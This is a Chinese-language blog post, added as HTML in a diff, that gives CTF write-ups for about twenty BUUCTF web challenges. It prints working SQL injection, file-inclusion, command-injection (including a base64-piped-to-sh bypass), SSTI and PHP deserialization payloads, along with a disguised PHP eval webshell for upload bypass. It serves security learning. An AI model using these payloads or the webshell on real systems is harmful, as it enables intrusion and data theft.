@@ -1,0 +1,886 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>buuctf 每日一题 | gudiffany_blog</title>
+<link rel="shortcut icon" href="https://gudiffany.github.io//favicon.ico?v=1664035635611">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://gudiffany.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="buuctf 每日一题 | gudiffany_blog - Atom Feed" href="https://gudiffany.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="buuctf 每日一题（更新中）
+1.[极客大挑战 2019]EasySQL 2022.8.15
+post类型的报错注入
+对username和password注入都存在sql注入
+那么使用万能密码可以直接get flag
+' or 1=1#..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://gudiffany.github.io/">
+  <img class="avatar" src="https://gudiffany.github.io//images/avatar.png?v=1664035635611" alt="">
+  </a>
+  <h1 class="site-title">
+    gudiffany_blog
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="/find" class="menu">
+          find
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              buuctf 每日一题
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-08-15
+              </span>
+              <span>
+                21 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="buuctf-每日一题更新中">buuctf 每日一题（更新中）</h1>
+<h2 id="1极客大挑战-2019easysql-2022815">1.[极客大挑战 2019]EasySQL 2022.8.15</h2>
+<p>post类型的报错注入</p>
+<p>对username和password注入都存在sql注入</p>
+<p>那么使用万能密码可以直接get flag</p>
+<pre><code>' or 1=1#
+</code></pre>
+<p>但是既然出现报错语句，那么可以对其进行基本的报错注入</p>
+<pre><code>username=1&amp;password=1' or 1=1#
+</code></pre>
+<p>结果直接出现flag（比较简陋）</p>
+<h2 id="2hctf-2018warmup-2022816">2.[HCTF 2018]WarmUp 2022.8.16</h2>
+<p>开局一张图，反手看F12</p>
+<p>发现有注释source.php</p>
+<p>放入网址发现是php代码</p>
+<pre><code>if (! empty($_REQUEST['file'])
+    &amp;&amp; is_string($_REQUEST['file'])
+    &amp;&amp; emmm::checkFile($_REQUEST['file'])
+  ) {
+    include $_REQUEST['file'];
+    exit;
+  } else {
+    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
+  } 
+</code></pre>
+<p>上面要求file的要求：</p>
+<p>1.不为空</p>
+<p>2.是字符串</p>
+<p>3.经过checkFile函数</p>
+<p>看一下checkFile发现有hint.php</p>
+<p>看一下发现是提醒flag的所在flag in ffffllllaaaagggg</p>
+<p>那么</p>
+<pre><code>if (! isset($page) || !is_string($page)) {
+                echo &quot;you can't see it&quot;;
+                return false;
+            }
+
+            if (in_array($page, $whitelist)) {
+                return true;
+            }
+
+            $_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . '?', '?')
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+
+            $_page = urldecode($page);
+            $_page = mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . '?', '?')
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+            echo &quot;you can't see it&quot;;
+            return false;
+</code></pre>
+<pre><code>1.第一个``if``语句对变量进行检验，要求``$page``为字符串，否则返回false
+2.第二个``if``语句判断``$page``是否存在于``$whitelist``数组中，存在则返回true
+3.第三个``if``语句判断截取后的``$page``是否存在于``$whitelist``数组中，截取``$page``中``'?'``前部分，存在则返回true
+4.第四个``if``语句判断url解码并截取后的``$page``是否存在于``$whitelist``中，存在则返回true
+</code></pre>
+<p>那么分析下来需要在2，3，4中获得一个true反馈，那么第3个可以直接使用目录遍历漏洞直接达成，第四个通过url编码两次即可</p>
+<p>最终的两个payload：</p>
+<pre><code>?file=source.php?../../../../../ffffllllaaaagggg
+?file=source.php%253F../../../../../ffffllllaaaagggg
+</code></pre>
+<h2 id="3极客大挑战-2019havefun-2022817">3.[极客大挑战 2019]Havefun 2022.8.17</h2>
+<p>很简单的一道题</p>
+<p>查看代码发现是一个cat变量的get传参</p>
+<p>直接</p>
+<pre><code>?cat=dog
+</code></pre>
+<p>即可</p>
+<h2 id="4actf2020-新生赛include-2022817">4.[ACTF2020 新生赛]Include 2022.8.17</h2>
+<p>进入题目，有一个链接，点进去发现源代码空空</p>
+<p>再看看题目include，猜想可能是文件包含</p>
+<p>那么拿出最基本的payload试一下</p>
+<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre>
+<p>查看题目的文件协议（php://filter）,接着是以base64编码（read=convert.base64-encode），目标文件为“flag.php”，接着题目就会变成base64编码：</p>
+<pre><code>PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NmJjMjBiOGYtYWEwOC00OWE5LWFiMTItMWM3ZGQ4NzgxM2Q1fQo=
+</code></pre>
+<h2 id="5actf2020-新生赛exec-2022817">5.[ACTF2020 新生赛]Exec 2022.8.17</h2>
+<p>命令行注入，需要输入地址</p>
+<pre><code>1、命令注入我们要防备其对于一些符号的过滤导致我们不能成功注入，所以我们要多了解一些符号。
+2、;直接分号分隔
+管道符：作用和&amp;一样。前面和后面命令都要执行，无论前面真假
+3、| 按位或
+作用是直接执行|后面的语句
+4、|| 逻辑或
+作用是如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句
+5、&amp; 按位与
+&amp;前面和后面命令都要执行，无论前面真假
+6、&amp;&amp; 逻辑与
+如果前面为假，后面的命令就不执行，如果前面为真则再执行后面命令，这样两条命令都会被执行
+</code></pre>
+<pre><code>127.0.0.1;cd ../../../;cat flag
+127.0.0.1|cat /flag
+127.0.0.1 &amp; cat /*g
+127.0.0.1 || cat /f*g
+</code></pre>
+<p>以上payload都是可以的</p>
+<h2 id="6suctf-2019easysql-2022818">6.[SUCTF 2019]EasySQL 2022.8.18</h2>
+<p>堆叠注入</p>
+<p>问题：我们尚未可知如何猜测出后台源码的，不过在网上找到公布的源码文件也确实是这样子的</p>
+<pre><code>sql=select.post[‘query’].&quot;||flag from Flag&quot;;
+</code></pre>
+<p>直接上payload</p>
+<pre><code>*;1 
+1;set sql_mode=PIPES_AS_CONCAT;select 1
+</code></pre>
+<p>得到的语句</p>
+<pre><code>select *,1 from Flag  select * from table，返回查询表中的所有数据
+select 1;set sql_mode=PIPES_AS_CONCAT;select 1 and flag from Flag
+</code></pre>
+<pre><code>补充系统变量@@sql_modesql_mode：是一组mysql支持的基本语法及校验规则
+PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似
+
+常用sql_mode
+①ONLY_FULL_GROUP_BY
+对于GROUP BY聚合操作，如果在SELECT中的列，没有在GROUP BY中出现，那么这个SQL是不合法的，因为列不在GROUP BY从句中
+②NO_AUTO_VALUE_ON_ZERO
+该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。
+③STRICT_TRANS_TABLES
+如果一个值不能插入到一个事务中，则中断当前的操作，对非事务表不做限制
+④NO_ZERO_IN_DATE
+不允许日期和月份为零
+⑤NO_ZERO_DATE
+mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告
+⑥ERROR_FOR_DIVISION_BY_ZERO
+在insert或update过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时Mysql返回NULL
+⑦NO_AUTO_CREATE_USER
+禁止GRANT创建密码为空的用户
+⑧NO_ENGINE_SUBSTITUTION
+如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常
+⑨PIPES_AS_CONCAT
+将&quot;||&quot;视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样是，也和字符串的拼接函数Concat想类似
+⑩ANSI_QUOTES
+不能用双引号来引用字符串，因为它被解释为识别符
+</code></pre>
+<h2 id="7强网杯-2019随便注-2022818">7.[强网杯 2019]随便注 2022.8.18</h2>
+<p>SQL 支持两种重命名表的方式：</p>
+<pre><code>alter table old_table_name rename to new_table_name; 
+rename old_table _name to new_table_name;
+</code></pre>
+<p>法一</p>
+<pre><code>0';alter table `words` rename to `words1`;alter table `1919810931114514` rename to `words`;alter table `words` change `flag` `id` varchar(100);#
+</code></pre>
+<p>法二</p>
+<pre><code>打开一个表名为 tbl_name 的表的句柄
+
+HANDLER tbl_name OPEN [ [AS] alias]
+
+1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览
+
+HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)
+    [ WHERE where_condition ] [LIMIT ... ]
+
+2、通过索引查看表
+
+FIRST: 获取第一行（索引最小的一行）
+
+NEXT: 获取下一行
+
+PREV: 获取上一行
+
+LAST: 获取最后一行（索引最大的一行）
+
+HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
+    [ WHERE where_condition ] [LIMIT ... ]
+
+3、不通过索引查看表
+
+READ FIRST: 获取句柄的第一行
+
+READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）
+
+最后一行执行之后再执行 READ NEXT 会返回一个空的结果
+
+HANDLER tbl_name READ { FIRST | NEXT }
+    [ WHERE where_condition ] [LIMIT ... ]
+
+关闭已打开的句柄
+
+HANDLER tbl_name CLOSE
+</code></pre>
+<pre><code>-1';handler `1919810931114514` open;handler `1919810931114514` read first;#
+</code></pre>
+<p>法三</p>
+<pre><code>MySQL的预编译语法为：
+
+
+//定义预编译语句
+PREPARE stmt_name FROM preparable_stmt;
+//执行预编译语句
+EXECUTE stmt_name [USING @var_name [, @var_name] ...];
+
+解释一下，定义的时候，preparable_stmt代表的是预留数据位置的SQL语句，而stmt_name是类似变量名，代表这个SQL语句，下面举个例子：
+
+
+
+PREPARE test FROM 'SELECT (? + ?)';
+//即定义了一个两数相加的SQL预编译语句
+
+执行时，@var_name即变量，可以带入语句中进行执行，如：
+
+SET @a = 1;
+SET @b = 2; //给变量赋值
+
+EXECUTE test USING @a,@b;//执行 
+</code></pre>
+<p>作者：白袍大人 https://www.bilibili.com/read/cv5071554/ 出处：bilibili</p>
+<pre><code>-1';set @sql = CONCAT('sele','ct * from `1919810931114514`;');prepare aaa from @sql;EXECUTE aaa;#
+</code></pre>
+<h2 id="8极客大挑战-2019secret-file-2022823">8.[极客大挑战 2019]Secret File 2022.8.23</h2>
+<p>首先查看源代码，发现一个网址</p>
+<pre><code>href=&quot;[./Archive_room.php]&quot;
+</code></pre>
+<p>进入之后存在</p>
+<pre><code>href=&quot;[./action.php]&quot;
+</code></pre>
+<p>点击之后给出提示</p>
+<pre><code>查阅完毕，没看清么？回去再仔细看看吧。
+</code></pre>
+<p>因此存在重定向，用burp抓包</p>
+<pre><code>secr3t.php
+</code></pre>
+<p>进入之后得到源代码</p>
+<pre><code>$file=$_GET['file'];  
+if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){    
+echo &quot;Oh no!&quot;;    
+exit();  
+}  
+include($file); //flag放在了flag.php里
+</code></pre>
+<p>说明要传参file，不能用文件目录，文件tp命令，input命令，目录包含</p>
+<p>但是可以使用文件包含</p>
+<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre>
+<p>即可得出flag</p>
+<h2 id="9gxyctf2019ping-ping-ping-2022823">9.[GXYCTF2019]Ping Ping Ping 2022.8.23</h2>
+<pre><code>?ip=127.0.0.1;cat flag
+</code></pre>
+<p>但是过滤了空格</p>
+<p>绕过方法</p>
+<pre><code>$IFS
+${IFS}
+$IFS$1   //$1改成$加其他数字貌似都行
+$IFS$9      (Ubuntu下测试通过)后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php
+&lt; 
+&lt;&gt; 
+{cat,flag.php}  //用逗号实现了空格功能
+%20 
+%09 
+
+ps:有时会禁用cat:
+解决方法是使用tac反向输出命令：
+linux命令中可以加，所以甚至可以cat /flag
+</code></pre>
+<p>第二，过滤了flag，查看一下index.php</p>
+<pre><code>/?ip= |\'|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){    
+echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match); //过滤*   
+die(&quot;fxck your symbol!&quot;);  
+} 
+else if(preg_match(&quot;/ /&quot;, $ip)){    
+die(&quot;fxck your space!&quot;);  
+} 
+else if(preg_match(&quot;/bash/&quot;, $ip)){    
+die(&quot;fxck your bash!&quot;);  
+} 
+else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){    
+die(&quot;fxck your flag!&quot;);  }  
+$a = shell_exec(&quot;ping -c 4 &quot;.$ip);  
+echo &quot;
+&quot;;
+  print_r($a);
+}
+?&gt;
+</code></pre>
+<p>法一：</p>
+<p>变量覆盖</p>
+<pre><code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
+</code></pre>
+<p>法二：</p>
+<p>绕过bash</p>
+<pre><code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
+</code></pre>
+<p>法三：</p>
+<p>内联，将输出的作为输入变量，使用反引号的优先执行特性</p>
+<pre><code>?ip=127.0.0.1;cat$IFS$1`ls`
+</code></pre>
+<h2 id="10极客大挑战-2019lovesql-2022823">10.[极客大挑战 2019]LoveSQL 2022.8.23</h2>
+<p>使用万能密码试一下，发现password，看情况是md5加密的，不可逆</p>
+<p>只能手动报错注入了</p>
+<p>最终payload</p>
+<pre><code>/check.php?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=1
+
+/check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23&amp;password=1
+
+/check.php?username=1' union select 1,2,group_concat(password) from l0ve1ysq1%23&amp;password=1
+</code></pre>
+<h2 id="11bsidessf2020mini-matroyshka-2022824">11.[BSidesSF2020]mini-matroyshka 2022.8.24</h2>
+<p>我至今见过的套娃最多的题目</p>
+<pre><code>解码过程
+1.base64
+2.base64
+3.base64
+4.解压
+5.base16
+6.解压
+7.base64
+8.解压
+9.base32
+10.base16
+11.解压
+12.base64
+13.解压
+14.base16
+15.解压
+16.base16
+17.八进制转字符
+18.base64
+19.解压
+20.base64
+21.16进制转字符
+22.base64
+23.特定字符url解码
+24.base85
+25.10进制转字符
+26.base64
+27.解压
+28.base64
+29.摩斯电码
+30.base32
+31.base64
+32.base85
+33.解压
+34.base64
+35.base16
+36.10进制转字符
+37.base85
+38.摩斯电码
+39.base32
+</code></pre>
+<p>一把梭脚本如下</p>
+<pre><code class="language-python">import base64
+import gzip
+import re
+import urllib.parse
+
+dict = {
+    '.-': 'A',
+    '-...': 'B',
+    '-.-.': 'C',
+    '-..': 'D',
+    '.': 'E',
+    '..-.': 'F',
+    '--.': 'G',
+    '....': 'H',
+    '..': 'I',
+    '.---': 'J',
+    '-.-': 'K',
+    '.-..': 'L',
+    '--': 'M',
+    '-.': 'N',
+    '---': 'O',
+    '.--.': 'P',
+    '--.-': 'Q',
+    '.-.': 'R',
+    '...': 'S',
+    '-': 'T',
+    '..-': 'U',
+    '...-': 'V',
+    '.--': 'W',
+    '-..-': 'X',
+    '-.--': 'Y',
+    '--..': 'Z',
+    '.----': '1',
+    '..---': '2',
+    '...--': '3',
+    '....-': '4',
+    '.....': '5',
+    '-....': '6',
+    '--...': '7',
+    '---..': '8',
+    '----.': '9',
+    '-----': '0',
+    ',': '--..--',
+    '.-.-.-': '.',
+    '..--..': '?',
+    '-..-.': '/',
+    '-....-': '-',
+    '-.--.': '(',
+    '-.--.-': ')',
+    '-...-': '='
+};
+with open('flag.txt') as f:
+    content = f.read()
+content = content.strip()
+content = content.strip(&quot;'&quot;)
+content = content.strip(&quot;b'&quot;)
+content = content.encode()
+s = content
+s1 = base64.b64decode(s)
+s2 = base64.b64decode(s1)
+s3 = base64.b64decode(s2)
+s4 = gzip.decompress(s3)
+s5 = base64.b16decode(s4)
+s6 = gzip.decompress(s5)
+s7 = base64.b64decode(s6)
+s8 = gzip.decompress(s7)
+s9 = base64.b32decode(s8)
+s10 = base64.b16decode(s9)
+s11 = gzip.decompress(s10)
+s12 = base64.b64decode(s11)
+s13 = gzip.decompress(s12)
+s14 = base64.b16decode(s13)
+s15 = gzip.decompress(s14)
+s16 = base64.b16decode(s15)
+s16 = s16.decode()
+number = re.findall(&quot;\d+&quot;, s16)
+s17 = ''
+for i in number:
+    s17 += chr(int(i, 8))
+s18 = base64.b64decode(s17)
+s19 = gzip.decompress(s18)
+s20 = base64.b64decode(s19)
+s20 = s20.decode()
+number = re.findall(&quot;[0-9a-zA-Z]+&quot;, s20)
+s21 = ''
+for i in number:
+    s21 += chr(int(i, 16))
+s21 = s21.encode()
+s22 = base64.b64decode(s21)
+s22 = s22.decode()
+s22 = urllib.parse.unquote(s22)
+s22 = s22.encode()
+s23 = base64.b85decode(s22)
+s23 = s23.decode()
+res = ''
+number = re.findall(&quot;[0-9]+&quot;, s23)
+for i in number:
+    res += chr(int(i, 10))
+s23 = res.encode()
+s24 = base64.b64decode(s23)
+s25 = gzip.decompress(s24)
+s26 = base64.b64decode(s25)
+
+res = s26.decode()
+s27 = res.split(&quot; &quot;)
+s28 = ''
+for i in s27:
+    s28 += dict[i]
+s28 = s28.encode()
+s29 = base64.b32decode(s28)
+s30 = base64.b64decode(s29)
+s31 = base64.b85decode(s30)
+s32 = gzip.decompress(s31)
+s33 = base64.b64decode(s32)
+s34 = base64.b16decode(s33)
+s34 = s34.decode()
+res = ''
+number = re.findall(&quot;[0-9]+&quot;, s34)
+for i in number:
+    res += chr(int(i, 10))
+s35 = res.encode()
+s36 = base64.b85decode(s35)
+s36 = s36.decode()
+s37 = ''
+s38 = s36.split(&quot; &quot;)
+for i in s38:
+    s37 += dict[i]
+s37 = s37.encode()
+s37 = base64.b32decode(s37)
+print(s37.decode())
+</code></pre>
+<h2 id="12极客大挑战-2019knife-2022829">12.[极客大挑战 2019]Knife 2022.8.29</h2>
+<p>使用中国蚁剑链接即可在根目录下找到flag</p>
+<h2 id="13极客大挑战-2019http-2022829">13.[极客大挑战 2019]Http 2022.8.29</h2>
+<p>首先在源代码里面找到/Secret.php</p>
+<p>然后，根据提示添加修改报头</p>
+<pre><code>1.Referer:https://Sycsecret.buuoj.cn
+2.User-Agent: Syclover
+3.X-Forwarded-For:127.0.0.1
+</code></pre>
+<pre><code>GET /Secret.php HTTP/1.1
+Host: node4.buuoj.cn:25469
+User-Agent: Syclover
+referer:https://Sycsecret.buuoj.cn
+Content-Length: 0
+X-Forwarded-For:127.0.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+</code></pre>
+<p>然后发包即可</p>
+<h2 id="14极客大挑战-2019upload-202294">14.[极客大挑战 2019]Upload 2022.9.4</h2>
+<p>首先用burp抓包上传文件的包，注意需要对原本上传的文件更改后缀名字.jpg</p>
+<p>然后</p>
+<pre><code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.phtml&quot;
+Content-Type: image/jpeg
+</code></pre>
+<p>Content-Type:更改为以上形式</p>
+<p>发现对文件内容也进行了限制，过滤了</p>
+<pre><code>&lt;?
+</code></pre>
+<p>可以使用文件头绕过</p>
+<pre><code>GIF89a?
+&lt;script language=&quot;php&quot;&gt;@eval($_POST[shell])&lt;/script&gt;
+</code></pre>
+<p>最后使用蚁剑链接找到flag</p>
+<h2 id="15actf2020-新生赛upload-202294">15.[ACTF2020 新生赛]Upload 2022.9.4</h2>
+<p>同第14，只需完成第一步更改文件后缀即可，之后用蚁剑链接（会给出详细地址）</p>
+<h2 id="16极客大挑战-2019babysql-202295">16.[极客大挑战 2019]BabySQL 2022.9.5</h2>
+<p>使用最基本的判断字段回显的过程中，发现关键字被过滤</p>
+<p>使用双写绕过即可，其他与sql-labs完全一样</p>
+<pre><code class="language-sql">group_concat(schema_name) from information_schema.schemata--+
+
+group_concat(table_name) from information_schema.tables where table_schema='ctf'--+
+
+group_concat(column_name) from information_schema.columns where table_name='Flag'--+
+
+group_concat(flag) from ctf.Flag--+
+</code></pre>
+<p>可以试试上面的语句，少了什么加什么</p>
+<h2 id="17roarctf-2019easy-calc-202295">17.[RoarCTF 2019]Easy Calc 2022.9.5</h2>
+<p>相关函数：</p>
+<pre><code>print_r() 函数用于打印变量，以更容易理解的形式展示，获得变量信息
+var_dump() 函数用于输出变量的相关信息
+var_dump()和print_r()：可以打印复合型和资源型数据；var_dump()更加详细
+
+file_get_contents() 函数把整个文件读入一个字符串中，相比于file()，推荐使用file_get_contents()
+scandir() 函数返回指定目录中的文件和目录的数组
+</code></pre>
+<p>首先对于查看的源代码来看，会经过url编码导致无法通过</p>
+<pre><code>共同点：都不会对ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ’ ( ) 。
+
+区别：
+1.encodeURI()方法的目的是对 URI 进行完整的编码，因此对以下在 URI 中具有特殊含义的 ASCII 标点符号，encodeURI() 函数是不会进行转义的：;/?:@&amp;=+$,#
+。encodeURIComponent()方法会对这些字符进行转义，以十六进制替换。
+2.encodeURI()方法用于整个的URI，而encodeURIComponent()常用于处理URI中的部分参数，比如浏览器地址有中文或者浏览器url参数操作的时候常用encodeURIComponent()。
+————————————————
+版权声明：本文为CSDN博主「web_harry」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
+原文链接：https://blog.csdn.net/web_harry/article/details/72191287
+</code></pre>
+<p>方法一：空格绕过waf</p>
+<p><a href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性Bypass - FreeBuf网络安全行业门户</a></p>
+<p>方法二：http走私</p>
+<p>暂时没复现</p>
+<p>之后要绕过</p>
+<pre><code>&lt;?php
+error_reporting(0);
+if(!isset($_GET['num'])){
+  show_source(__FILE__);
+}else{
+    $str = $_GET['num'];
+    $blacklist = [' ', '\t', '\r', '\n','\'', '&quot;', '`', '\[', '\]','\$','\\','\^'];
+    foreach ($blacklist as $blackitem) {
+        if (preg_match('/' . $blackitem . '/m', $str)) {
+            die(&quot;what are you want to do?&quot;);
+        }
+    }
+    eval('echo '.$str.';');
+}
+?&gt;
+</code></pre>
+<p>使用chr函数编码即可</p>
+<pre><code>? num=var_dump(scandir(chr(47)))
+? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
+</code></pre>
+<h2 id="18护网杯-2018easy_tornado-202296">18.[护网杯 2018]easy_tornado 2022.9.6</h2>
+<pre><code>POST /pay.php HTTP/1.1
+Host: bc0e0b90-54d1-4946-9f95-83a6bec9b0da.node4.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://bc0e0b90-54d1-4946-9f95-83a6bec9b0da.node4.buuoj.cn:81/
+Connection: close
+Cookie: user=1
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 23
+
+password=404a&amp;money=1e9
+</code></pre>
+<p>首先要是cuit的学生：那么猜测需要更改cookie，用1试一下，不然只能开爆破了</p>
+<p>第二需要正确的pwd，根据php弱类型传入404a</p>
+<p>第三需要100000000的钱数，但是长度不能过长，使用科学计数法1e9</p>
+<h2 id="19护网杯-2018easy_tornado">19.[护网杯 2018]easy_tornado</h2>
+<p>首先在三个链接中获得：</p>
+<p>1.flag地址</p>
+<p>2.render</p>
+<p>3.加密方式</p>
+<p>从render中发现渲染模板进行ssti注入</p>
+<pre><code>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用。
+Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。
+在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量
+</code></pre>
+<p>然后注入点在error?msg=Error处</p>
+<p>通过</p>
+<pre><code>msg={{handler.settings}}
+</code></pre>
+<p>获取秘密cookie</p>
+<p>然后写脚本</p>
+<pre><code>import hashlib
+
+string = 'f5474199-8c4d-4bde-a54a-1dca9c094208'
+sec = '/fllllllllllllag'
+
+
+def md5(s):
+    md5 = hashlib.md5()
+    md5.update(s.encode('utf-8'))  # 转码，update里的必须是字节型
+    res = md5.hexdigest()  # 返回字符型摘要信息
+    return res
+
+
+print(&quot;md5加密结果:&quot;, md5(string + md5(sec)))
+</code></pre>
+<p>构造payload</p>
+<pre><code>file?filename=/fllllllllllllag&amp;filehash=9a2ccbbc7d48bb5aacb23f02e0737444
+</code></pre>
+<p>获得flag</p>
+<h2 id="20极客大挑战-2019php">20.[极客大挑战 2019]PHP</h2>
+<p>1.先用dirsearch扫一下</p>
+<p>出现www.zip</p>
+<p>然后看源码</p>
+<p>2.首先要传参select，该变量会进行反序列化，那么本题应该就是反序列化了</p>
+<p>3.只要</p>
+<pre><code>&lt;?php
+
+class Name
+{
+    private $username = 'nonono';
+    private $password = 'yesyes';
+
+    public function __construct($username, $password)
+    {
+        $this-&gt;username = $username;
+        $this-&gt;password = $password;
+    }
+}
+
+$a = new Name('admin', 100);
+
+var_dump(serialize($a))
+
+?&gt;
+</code></pre>
+<p>得出</p>
+<p>其中过滤了部分符号，用%00代替，而且要绕过__wakeup()函数，属性个数大于实际属性个数时，就会跳过wakeup()</p>
+<pre><code>http://29ca719a-6559-4472-a0e1-d855df860e55.node4.buuoj.cn:81/?select=O:4:&quot;Name&quot;:4:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}
+</code></pre>
+<h2 id="21actf2020-新生赛backupfile">21.[ACTF2020 新生赛]BackupFile</h2>
+<p>1.dirsearch下载到index.php.bak</p>
+<p>2.弱类型比较</p>
+<pre><code>&lt;?php
+include_once &quot;flag.php&quot;;
+if(isset($_GET['key'])) {
+    $key = $_GET['key'];
+    if(!is_numeric($key)) {
+        exit(&quot;Just num!&quot;);
+    }
+    $key = intval($key);
+    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;
+    if($key == $str) {
+        echo $flag;
+    }
+}
+else {
+    echo &quot;Try to find out source file!&quot;;
+}
+</code></pre>
+<pre><code>http://e1c3daab-623c-4fc6-8493-a3d7725aaa6b.node4.buuoj.cn:81/?key=123
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#buuctf-%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E6%9B%B4%E6%96%B0%E4%B8%AD">buuctf 每日一题（更新中）</a>
+<ul>
+<li><a href="#1%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019easysql-2022815">1.[极客大挑战 2019]EasySQL 2022.8.15</a></li>
+<li><a href="#2hctf-2018warmup-2022816">2.[HCTF 2018]WarmUp 2022.8.16</a></li>
+<li><a href="#3%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019havefun-2022817">3.[极客大挑战 2019]Havefun 2022.8.17</a></li>
+<li><a href="#4actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Binclude-2022817">4.[ACTF2020 新生赛]Include 2022.8.17</a></li>
+<li><a href="#5actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bexec-2022817">5.[ACTF2020 新生赛]Exec 2022.8.17</a></li>
+<li><a href="#6suctf-2019easysql-2022818">6.[SUCTF 2019]EasySQL 2022.8.18</a></li>
+<li><a href="#7%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%9A%8F%E4%BE%BF%E6%B3%A8-2022818">7.[强网杯 2019]随便注 2022.8.18</a></li>
